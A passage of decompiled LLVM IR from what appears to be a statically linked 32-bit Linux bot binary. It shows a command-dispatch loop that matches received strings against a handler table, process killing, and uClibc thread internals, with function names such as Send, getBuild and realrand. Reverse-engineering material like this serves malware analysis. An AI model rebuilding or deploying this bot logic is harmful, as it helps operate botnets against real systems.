  %v5_805620f = call i32 @strcpy(i8* %v3_80561b5.pre, i32 %v3_80561f9)
  %v0_8056214 = load i32, i32* @esp, align 4
  %v1_8056214 = add i32 %v0_8056214, 16
  %v4_805626a153 = load i32, i32* bitcast ([4 x i8]** @global_var_8070100.612 to i32*), align 8
  store i32 %v4_805626a153, i32* %eax.global-to-local, align 4
  %v1_8056271154 = icmp eq i32 %v4_805626a153, 0
  %v1_8056273155 = icmp eq i1 %v1_8056271154, false
  br i1 %v1_8056273155, label %dec_label_pc_8056220, label %dec_label_pc_8056275

dec_label_pc_8056220:                             ; preds = %dec_label_pc_80561e3, %dec_label_pc_8056220
  %v3_805626a159 = phi i32* [ %v3_805626a, %dec_label_pc_8056220 ], [ bitcast ([4 x i8]** @global_var_8070100.612 to i32*), %dec_label_pc_80561e3 ]
  %v1_805626a158 = phi i32 [ %v1_805626a, %dec_label_pc_8056220 ], [ 0, %dec_label_pc_80561e3 ]
  %storemerge157 = phi i32 [ %v4_8056264, %dec_label_pc_8056220 ], [ 0, %dec_label_pc_80561e3 ]
  %v0_805622a156 = phi i32 [ %v1_8056261, %dec_label_pc_8056220 ], [ %v1_8056214, %dec_label_pc_80561e3 ]
  store i32 %storemerge157, i32* %eax.global-to-local, align 4
  %v4_8056223 = load i32, i32* %v3_805626a159, align 8
  store i32 %v4_8056223, i32* %edx.global-to-local, align 4
  store i32 %v2_80561f2, i32* %eax.global-to-local, align 4
  %v2_8056233 = add i32 %v0_805622a156, -12
  %v3_8056233 = inttoptr i32 %v2_8056233 to i32*
  store i32 %v2_80561f2, i32* %v3_8056233, align 4
  %v0_8056234 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056234 = add i32 %v0_805622a156, -16
  %v3_8056234 = inttoptr i32 %v2_8056234 to i32*
  store i32 %v0_8056234, i32* %v3_8056234, align 4
  %v1_8056235 = load i32, i32* %stack_var_-24, align 4
  %v2_8056235 = inttoptr i32 %storemerge157 to i8*
  %v3_8056235 = call i32 @__GI_strcasecmp(i8* %v2_8056235, i32 %v1_8056235)
  %v0_805623a = load i32, i32* @esp, align 4
  store i32 %storemerge157, i32* %eax.global-to-local, align 4
  %v2_8056244 = add i32 %v1_805626a158, ptrtoint (i32* @global_var_8070104.613 to i32)
  %v3_8056244 = inttoptr i32 %v2_8056244 to i32*
  %v4_8056244 = load i32, i32* %v3_8056244, align 4
  %v0_805624b = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_805624b, i32* %edx.global-to-local, align 4
  %v3_8056254 = load i8*, i8** %stack_var_-32, align 4
  %v4_8056254 = ptrtoint i8* %v3_8056254 to i32
  %v6_8056254 = add i32 %v0_805623a, 8
  %v7_8056254 = inttoptr i32 %v6_8056254 to i32*
  store i32 %v4_8056254, i32* %v7_8056254, align 4
  store i32 %v2_805619b, i32* %eax.global-to-local, align 4
  %v2_805625d = add i32 %v0_805623a, 4
  %v3_805625d = inttoptr i32 %v2_805625d to i32*
  store i32 %v2_805619b, i32* %v3_805625d, align 4
  %v0_805625e = load i32, i32* %edx.global-to-local, align 4
  %v3_805625e = inttoptr i32 %v0_805623a to i32*
  store i32 %v0_805625e, i32* %v3_805625e, align 4
  %v1_805625f = add i32 %v0_805623a, -4
  %v2_805625f = inttoptr i32 %v1_805625f to i32*
  store i32 134570593, i32* %v2_805625f, align 4
  call void @__pseudo_call(i32 %v4_8056244)
  %v0_8056261 = load i32, i32* @esp, align 4
  %v1_8056261 = add i32 %v0_8056261, 16
  %v4_8056264 = add i32 %storemerge157, 1
  store i32 %v4_8056264, i32* %eax.global-to-local, align 4
  %v1_805626a = mul i32 %v4_8056264, 8
  %v2_805626a = add i32 %v1_805626a, ptrtoint ([4 x i8]** @global_var_8070100.612 to i32)
  %v3_805626a = inttoptr i32 %v2_805626a to i32*
  %v4_805626a = load i32, i32* %v3_805626a, align 8
  store i32 %v4_805626a, i32* %eax.global-to-local, align 4
  %v1_8056271 = icmp eq i32 %v4_805626a, 0
  %v1_8056273 = icmp eq i1 %v1_8056271, false
  br i1 %v1_8056273, label %dec_label_pc_8056220, label %dec_label_pc_8056275

dec_label_pc_8056275:                             ; preds = %dec_label_pc_8056220, %dec_label_pc_80561e3
  %v0_805622a.lcssa = phi i32 [ %v1_8056214, %dec_label_pc_80561e3 ], [ %v1_8056261, %dec_label_pc_8056220 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_80561e3 ], [ %v4_8056264, %dec_label_pc_8056220 ]
  %v1_8056278 = add i32 %v0_805622a.lcssa, -12
  %v2_8056278 = inttoptr i32 %v1_8056278 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_806c77e.614 to i32), i32* %v2_8056278, align 4
  store i32 %v2_80561f2, i32* %eax.global-to-local, align 4
  %v2_8056283 = add i32 %v0_805622a.lcssa, -16
  %v3_8056283 = inttoptr i32 %v2_8056283 to i32*
  store i32 %v2_80561f2, i32* %v3_8056283, align 4
  %v1_8056284 = load i32, i32* %stack_var_-24, align 4
  %v2_8056284 = inttoptr i32 %storemerge.lcssa to i8*
  %v3_8056284 = call i32 @__GI_strcasecmp(i8* %v2_8056284, i32 %v1_8056284)
  store i32 %v3_8056284, i32* @eax, align 4
  %v0_8056289 = load i32, i32* @esp, align 4
  %v1_805628c = icmp eq i32 %v3_8056284, 0
  %v1_805628e = icmp eq i1 %v1_805628c, false
  br i1 %v1_805628e, label %dec_label_pc_80562dd, label %dec_label_pc_8056290

dec_label_pc_8056290:                             ; preds = %dec_label_pc_8056275
  %v1_8056289 = add i32 %v0_8056289, 16
  %v0_8056290 = load i32, i32* @global_var_80748e0.351, align 32
  store i32 %v0_8056290, i32* %eax.global-to-local, align 4
  %v1_8056295 = icmp eq i32 %v0_8056290, 0
  br i1 %v1_8056295, label %dec_label_pc_80562ba, label %dec_label_pc_8056299

dec_label_pc_8056299:                             ; preds = %dec_label_pc_8056290
  store i32 %v0_8056290, i32* %eax.global-to-local, align 4
  %v1_80562a1 = add i32 %v0_8056289, 4
  %v2_80562a1 = inttoptr i32 %v1_80562a1 to i32*
  store i32 9, i32* %v2_80562a1, align 4
  %v0_80562a3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80562a3 = inttoptr i32 %v0_8056289 to i32*
  store i32 %v0_80562a3, i32* %v3_80562a3, align 4
  %v1_80562a4 = load i32, i32* %stack_var_-24, align 4
  %v2_80562a4 = call i32 @kill(i32 %storemerge.lcssa, i32 %v1_80562a4)
  store i32 %v2_80562a4, i32* %eax.global-to-local, align 4
  %v0_80562a9 = load i32, i32* @esp, align 4
  %v1_80562a9 = add i32 %v0_80562a9, 16
  %v1_80562ac = icmp eq i32 %v2_80562a4, 0
  %v1_80562ae = icmp eq i1 %v1_80562ac, false
  br i1 %v1_80562ae, label %dec_label_pc_80562ba, label %dec_label_pc_80562b0

dec_label_pc_80562b0:                             ; preds = %dec_label_pc_8056299
  store i32 0, i32* @global_var_80748e0.351, align 32
  br label %dec_label_pc_80562ba

dec_label_pc_80562ba:                             ; preds = %dec_label_pc_8056299, %dec_label_pc_8056290, %dec_label_pc_80562b0
  %v0_80562bf = phi i32 [ %v1_80562a9, %dec_label_pc_8056299 ], [ %v1_8056289, %dec_label_pc_8056290 ], [ %v1_80562a9, %dec_label_pc_80562b0 ]
  %v0_80562ba = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_80562ba, i32* %eax.global-to-local, align 4
  %v2_80562c2 = add i32 %v0_80562bf, -16
  %v3_80562c2 = inttoptr i32 %v2_80562c2 to i32*
  store i32 %v0_80562ba, i32* %v3_80562c2, align 4
  %v1_80562c3 = call i32 @close(i32 %storemerge.lcssa)
  store i32 %v1_80562c3, i32* %eax.global-to-local, align 4
  %v0_80562c8 = load i32, i32* @esp, align 4
  %v2_80562ce = inttoptr i32 %v0_80562c8 to i32*
  store i32 5, i32* %v2_80562ce, align 4
  %v1_80562d0 = call i32 @sleep(i32 %storemerge.lcssa)
  store i32 %v1_80562d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055ed7

dec_label_pc_80562dd:                             ; preds = %dec_label_pc_8056275
  %v1_80562e0 = add i32 %v0_8056289, 4
  %v2_80562e0 = inttoptr i32 %v1_80562e0 to i32*
  store i32 ptrtoint (i32* @global_var_806c77c.610 to i32), i32* %v2_80562e0, align 4
  %v2_80562e5 = inttoptr i32 %v0_8056289 to i32*
  store i32 0, i32* %v2_80562e5, align 4
  %v1_80562e7 = load i32, i32* %stack_var_-24, align 4
  %v2_80562e7 = call i32 @__GI_strtok(i32 %storemerge.lcssa, i32 %v1_80562e7)
  store i32 %v2_80562e7, i32* %eax.global-to-local, align 4
  %v0_80562ec = load i32, i32* @esp, align 4
  store i32 %v2_80562e7, i32* %tmp105, align 4
  %v5_80562f2 = icmp eq i32 %v2_80562e7, 0
  %tmp109 = inttoptr i32 %v2_80562e7 to i8*
  br i1 %v5_80562f2, label %dec_label_pc_8055f15.outer.outer, label %dec_label_pc_80562fc

dec_label_pc_80562fc:                             ; preds = %dec_label_pc_80560e8, %dec_label_pc_80562dd
  %v5_8056112.in = phi i32 [ %v0_80562ec, %dec_label_pc_80562dd ], [ %v0_8056107, %dec_label_pc_80560e8 ]
  %v3_8056112 = phi i8* [ %tmp109, %dec_label_pc_80562dd ], [ %v5_805610a, %dec_label_pc_80560e8 ]
  %stack_var_-6628.329 = phi i8* [ %stack_var_-6628.2.ph, %dec_label_pc_80562dd ], [ %stack_var_-6628.1.ph.ph111, %dec_label_pc_80560e8 ]
  %v4_80562fc = ptrtoint i8* %v3_8056112 to i32
  store i32 %v4_80562fc, i32* %eax.global-to-local, align 4
  %v2_80562ff = load i8, i8* %v3_8056112, align 1
  %v3_80562ff = zext i8 %v2_80562ff to i32
  %v5_80562ff = and i32 %v4_80562fc, -256
  %v6_80562ff = or i32 %v3_80562ff, %v5_80562ff
  store i32 %v6_80562ff, i32* %eax.global-to-local, align 4
  %v4_8056301 = icmp eq i8 %v2_80562ff, 0
  %v1_8056303 = icmp eq i1 %v4_8056301, false
  br i1 %v1_8056303, label %dec_label_pc_8056112, label %dec_label_pc_8055f15.outer.outer

dec_label_pc_805630e:                             ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_80562fc, { 1, 2, 0 }
  uselistorder i32 %v2_80562e7, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056289, { 3, 2, 1, 0, 4 }
  uselistorder i32 %storemerge.lcssa, { 4, 1, 0, 2, 3 }
  uselistorder i32* %v3_805626a, { 1, 0 }
  uselistorder i32 %v1_805626a, { 1, 0 }
  uselistorder i32 %v4_8056264, { 0, 2, 3, 1 }
  uselistorder i32 %v0_805623a, { 0, 3, 1, 2 }
  uselistorder i32 %storemerge157, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80561fe, { 1, 0 }
  uselistorder i32 %.pre58, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-6628.2.ph, { 2, 3, 0, 1 }
  uselistorder i8* %v3_80561b5.pre, { 3, 2, 0, 1 }
  uselistorder i32 %v0_8056180, { 1, 0 }
  uselistorder i32 %.pre66, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 0, 1, 3, 2 }
  uselistorder i32 %v5_8056120, { 1, 0 }
  uselistorder i8* %v3_805611d, { 4, 0, 3, 2, 1, 5, 6 }
  uselistorder i32 %v4_80560d3, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80560a9, { 2, 1, 0 }
  uselistorder i32 %v1_80560a1, { 1, 0 }
  uselistorder i32 %v0_805609a, { 2, 0, 1 }
  uselistorder i32 %stack_var_-40.3.lcssa, { 4, 1, 0, 3, 2, 5, 6 }
  uselistorder i32 %v0_80560c444, { 1, 0 }
  uselistorder i32 %v4_8056063, { 1, 2, 0 }
  uselistorder i32 %v2_8056047, { 2, 0, 1 }
  uselistorder i32 %storemerge8137, { 1, 0 }
  uselistorder i32 %v1_8056030, { 1, 3, 2, 0 }
  uselistorder i32 %v2_8055fd6, { 1, 2, 0 }
  uselistorder i32 %v2_8055fcc, { 1, 0, 2 }
  uselistorder i32 %v4_8055ff0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8055fd9133, { 1, 0 }
  uselistorder i32 %v2_8055fcc126, { 2, 1, 0 }
  uselistorder i32 %.pre, { 1, 5, 2, 3, 0, 6, 4 }
  uselistorder i32 %v2_8055f99, { 1, 0 }
  uselistorder i32 %stack_var_-40.3148, { 1, 0 }
  uselistorder i32 %storemerge7149, { 2, 1, 0 }
  uselistorder i32 %v1_8055f3d, { 1, 0 }
  uselistorder i32 %v2_8055f35, { 1, 0 }
  uselistorder i32 %v0_8055f2e, { 1, 0 }
  uselistorder i32 %stack_var_-40.1, { 1, 2, 0 }
  uselistorder i8* %stack_var_-6628.1.ph.ph111, { 2, 1, 0 }
  uselistorder i32 %v2_805619b, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v2_8055e9e, { 1, 0, 2 }
  uselistorder i32 %v2_8055e7e, { 1, 0, 2 }
  uselistorder i32 %v2_8055e5e, { 1, 0, 2 }
  uselistorder i32 %v2_8055e48, { 1, 0, 2 }
  uselistorder i32 %stack_var_-6624.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_8055e1d, { 2, 1, 0 }
  uselistorder i32 %v2_8055e0c, { 1, 0, 2 }
  uselistorder i32 %v2_8055dc8, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %storemerge10171, { 1, 0 }
  uselistorder i32* %v1_8055d82, { 1, 0, 2 }
  uselistorder i32 %v1_8055d7b, { 1, 0, 2 }
  uselistorder i32 %v2_8055d37, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-24, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32* %stack_var_-6656, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12 }
  uselistorder i8** %stack_var_-32, { 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 21, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 30, 31, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 17, 12, 13, 14, 15, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 33, 36, 37, 34, 35, 49, 38, 39, 41, 40, 1, 42, 44, 43, 0, 45, 46, 47, 48, 78, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 73, 67, 68, 69, 70, 71, 72, 79, 74, 75, 76, 77 }
  uselistorder i32 (i32)* @sleep, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [4 x i8]** @global_var_8070100.612, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 16, 15, 1, 14, 0, 13, 12, 11, 10, 8, 7, 9, 6, 3, 5, 2, 4 }
  uselistorder i32* @global_var_807e574.32, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* @global_var_80748f4.31, { 6, 7, 1, 8, 9, 10, 2, 0, 11, 3, 12, 4, 13, 14, 15, 5, 16, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 8, 2, 1, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32, i32)* @Send, { 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 162, 161, 160, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 12, 11, 2, 10, 9, 8, 7, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 59, 60, 61, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 62 }
  uselistorder i32* @global_var_807d2c0.63, { 1, 0 }
  uselistorder label %dec_label_pc_80562fc, { 1, 0 }
  uselistorder label %dec_label_pc_80562ba, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056220, { 1, 0 }
  uselistorder label %dec_label_pc_80561b2, { 1, 0 }
  uselistorder label %dec_label_pc_80561b2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056132, { 1, 0 }
  uselistorder label %dec_label_pc_805609a, { 1, 0 }
  uselistorder label %dec_label_pc_8056089, { 1, 0 }
  uselistorder label %dec_label_pc_8056070, { 1, 0 }
  uselistorder label %dec_label_pc_8056044, { 1, 0 }
  uselistorder label %dec_label_pc_8055fc9, { 1, 0 }
  uselistorder label %dec_label_pc_8055f96, { 1, 0 }
  uselistorder label %dec_label_pc_8055f15, { 1, 0 }
  uselistorder label %dec_label_pc_8055f15.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8055f15.outer.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055ed7, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055dc5, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_805631c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805631c, i32* @edx, align 4
  %v0_8056323 = load i32, i32* @esp, align 4
  %v1_8056323 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_8056323 = icmp ult i32 %v0_8056323, %v1_8056323
  %v1_8056329 = icmp eq i1 %v7_8056323, false
  br i1 %v1_8056329, label %dec_label_pc_805635a, label %dec_label_pc_805632b

dec_label_pc_805632b:                             ; preds = %entry
  %v1_805632b = load i32, i32* @global_var_8078e70.616, align 16
  %v7_805632b = icmp ult i32 %v0_8056323, %v1_805632b
  br i1 %v7_805632b, label %dec_label_pc_8056340, label %dec_label_pc_8056333

dec_label_pc_8056333:                             ; preds = %dec_label_pc_805632b
  %v1_8056338 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_8056338 = icmp ult i32 %v0_8056323, %v1_8056338
  br i1 %v7_8056338, label %dec_label_pc_805635a, label %dec_label_pc_8056340

dec_label_pc_8056340:                             ; preds = %dec_label_pc_8056333, %dec_label_pc_805632b
  %v0_8056340 = load i32, i32* @global_var_807e578.619, align 8
  %v1_8056340 = icmp eq i32 %v0_8056340, 0
  br i1 %v1_8056340, label %dec_label_pc_805634e, label %dec_label_pc_8056349

dec_label_pc_8056349:                             ; preds = %dec_label_pc_8056340
  %v0_8056349 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805634e

dec_label_pc_805634e:                             ; preds = %dec_label_pc_8056340, %dec_label_pc_8056349
  %v3_805634e = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_805634e, i32* @edx, align 4
  %v2_8056354 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805635a

dec_label_pc_805635a:                             ; preds = %dec_label_pc_8056333, %entry, %dec_label_pc_805634e
  %v0_805635a = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_8056333 ], [ 134693216, %entry ], [ %v2_8056354, %dec_label_pc_805634e ]
  ret i32 %v0_805635a

; uselistorder directives
  uselistorder label %dec_label_pc_805635a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805634e, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_805635e = call i32 @thread_self()
  %v1_8056363 = add i32 %v0_805635e, 76
  %v2_8056363 = inttoptr i32 %v1_8056363 to i32*
  %v3_8056363 = load i32, i32* %v2_8056363, align 4
  ret i32 %v3_8056363
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805636d = call i32 @thread_self()
  %v1_8056372 = add i32 %v0_805636d, 68
  %v2_8056372 = inttoptr i32 %v1_8056372 to i32*
  %v3_8056372 = load i32, i32* %v2_8056372, align 4
  ret i32 %v3_8056372
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805637c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056384 = load i32, i32* @global_var_8074358.620, align 8
  %v7_805638a = icmp slt i32 %v1_8056384, %arg1
  br i1 %v7_805638a, label %dec_label_pc_805638c, label %dec_label_pc_80563c3

dec_label_pc_805638c:                             ; preds = %entry
  %v1_8056391 = call i32 @sched_get_priority_max(i32 1)
  %v0_8056399 = load i32, i32* @ebx, align 4
  %v2_8056399 = sub i32 %v0_8056399, %v1_8056391
  %v8_8056399 = xor i32 %v0_8056399, %v1_8056391
  %v9_8056399 = xor i32 %v2_8056399, %v0_8056399
  %v10_8056399 = and i32 %v9_8056399, %v8_8056399
  %v11_8056399 = icmp slt i32 %v10_8056399, 0
  %v13_8056399 = icmp slt i32 %v2_8056399, 0
  %v2_805639b = icmp ne i1 %v13_8056399, %v11_8056399
  %v3_805639b = zext i1 %v2_805639b to i32
  %v2_80563a1 = add i32 %v3_805639b, %v0_8056399
  store i32 %v2_80563a1, i32* %stack_var_-8, align 4
  %v2_80563a8 = ptrtoint i32* %stack_var_-8 to i32
  %v0_80563af = load i32, i32* @global_var_8074354.621, align 4
  %v3_80563b5 = call i32 @sched_setscheduler(i32 %v0_80563af, i32 1, i32 %v2_80563a8)
  %v0_80563ba = load i32, i32* @ebx, align 4
  store i32 %v0_80563ba, i32* @global_var_8074358.620, align 8
  br label %dec_label_pc_80563c3

dec_label_pc_80563c3:                             ; preds = %entry, %dec_label_pc_805638c
  %.0 = phi i32 [ %v3_80563b5, %dec_label_pc_805638c ], [ undef, %entry ]
  store i32 %v0_805637c, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_8056399, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80563c3, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v0_80563d0 = load i32, i32* @global_var_8078d20.622, align 32
  %v1_80563d5 = icmp eq i32 %v0_80563d0, 0
  %v1_80563d7 = icmp eq i1 %v1_80563d5, false
  br i1 %v1_80563d7, label %dec_label_pc_80563e5.thread, label %dec_label_pc_80563e5

dec_label_pc_80563e5.thread:                      ; preds = %entry
  store i32 1, i32* @global_var_8078d20.622, align 32
  br label %dec_label_pc_8056429

dec_label_pc_80563e5:                             ; preds = %entry
  %v0_80563db = load i32, i32* @global_var_8078d24.623, align 4
  %v1_80563db = icmp eq i32 %v0_80563db, 0
  %v1_80563e2 = icmp eq i1 %v1_80563db, false
  %phitmp = icmp eq i1 %v1_80563e2, false
  store i32 1, i32* @global_var_8078d20.622, align 32
  br i1 %phitmp, label %dec_label_pc_8056429, label %dec_label_pc_80563f3

dec_label_pc_80563f3:                             ; preds = %dec_label_pc_80563e5
  store i32 0, i32* %stack_var_-148, align 4
  %v2_8056403 = ptrtoint i32* %stack_var_-148 to i32
  br label %dec_label_pc_8056403

dec_label_pc_8056403:                             ; preds = %dec_label_pc_805641f, %dec_label_pc_80563f3
  %v0_805640e = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_805640e, i32* %stack_var_-188, align 4
  %v3_8056414 = call i32 @__libc_write(i32 %v0_805640e, i32 %v2_8056403, i32 148)
  %v1_805641c = add i32 %v3_8056414, 1
  %v8_805641c = icmp eq i32 %v1_805641c, 0
  %v1_805641d = icmp eq i1 %v8_805641c, false
  br i1 %v1_805641d, label %dec_label_pc_8056429, label %dec_label_pc_805641f

dec_label_pc_805641f:                             ; preds = %dec_label_pc_8056403
  %v0_805641f = load i32, i32* %stack_var_-188, align 4
  %v1_805641f = call i32 @__errno_location(i32 %v0_805641f)
  %v1_8056424 = inttoptr i32 %v1_805641f to i32*
  %v2_8056424 = load i32, i32* %v1_8056424, align 4
  %v11_8056424 = icmp eq i32 %v2_8056424, 4
  br i1 %v11_8056424, label %dec_label_pc_8056403, label %dec_label_pc_805641f.dec_label_pc_8056429.loopexit_crit_edge

dec_label_pc_805641f.dec_label_pc_8056429.loopexit_crit_edge: ; preds = %dec_label_pc_805641f
  br label %dec_label_pc_8056429

dec_label_pc_8056429:                             ; preds = %dec_label_pc_8056403, %dec_label_pc_80563e5.thread, %dec_label_pc_805641f.dec_label_pc_8056429.loopexit_crit_edge, %dec_label_pc_80563e5
  %v0_805642f = phi i32 [ %v0_80563d0, %dec_label_pc_80563e5 ], [ %v1_805641f, %dec_label_pc_805641f.dec_label_pc_8056429.loopexit_crit_edge ], [ %v0_80563d0, %dec_label_pc_80563e5.thread ], [ %v1_805641c, %dec_label_pc_8056403 ]
  ret i32 %v0_805642f

; uselistorder directives
  uselistorder i32* %stack_var_-148, { 1, 0 }
  uselistorder label %dec_label_pc_8056429, { 2, 0, 3, 1 }
}

define i32 @pthread_kill_all_threads() local_unnamed_addr {
dec_label_pc_8056458:
  %stack_var_-12 = alloca i32, align 4
  %v0_8056432 = load i32, i32* @eax, align 4
  %v0_8056434 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v0_8056439 = load i32, i32* @ebx, align 4
  store i32 %v0_8056439, i32* %stack_var_-12, align 4
  %v0_805643a = load i32, i32* @edx, align 4
  store i32 %v0_8056434, i32* @ebx, align 4
  %v1_8056458 = icmp eq i32 %v0_805643a, 0
  br i1 %v1_8056458, label %dec_label_pc_805646a, label %dec_label_pc_805645c

dec_label_pc_805645c:                             ; preds = %dec_label_pc_8056458
  %v1_805645f = add i32 %v0_8056434, 20
  %v2_805645f = inttoptr i32 %v1_805645f to i32*
  %v3_805645f = load i32, i32* %v2_805645f, align 4
  %v2_8056462 = call i32 @kill(i32 %v3_805645f, i32 %v0_8056432)
  %v2_805646a.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805646a

dec_label_pc_805646a:                             ; preds = %dec_label_pc_8056458, %dec_label_pc_805645c
  %v2_805646a = phi i32 [ %v0_8056439, %dec_label_pc_8056458 ], [ %v2_805646a.pre, %dec_label_pc_805645c ]
  %v0_805646d = phi i32 [ %v0_8056434, %dec_label_pc_8056458 ], [ %v2_8056462, %dec_label_pc_805645c ]
  store i32 %v2_805646a, i32* @ebx, align 4
  ret i32 %v0_805646d

; uselistorder directives
  uselistorder i32 %v0_8056434, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805646a, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_805646e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805647c = call i32 @__libc_getpid(i32 %v0_805646e)
  %v1_8056481 = load i32, i32* @ebx, align 4
  %v2_8056481 = add i32 %v1_8056481, 20
  %v3_8056481 = inttoptr i32 %v2_8056481 to i32*
  store i32 %v1_805647c, i32* %v3_8056481, align 4
  %v0_8056485 = load i32, i32* @ebx, align 4
  %v1_8056485 = add i32 %v0_8056485, 100
  store i32 %v1_8056485, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_805648d = inttoptr i32 %v1_8056485 to %_TYPEDEF_sigset_t*
  %v4_805648d = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805648d, i32 0)
  store i32 %v4_805648d, i32* %eax.global-to-local, align 4
  %v0_8056492 = load i32, i32* @ebx, align 4
  %v1_8056492 = add i32 %v0_8056492, 228
  %v2_8056492 = inttoptr i32 %v1_8056492 to i32*
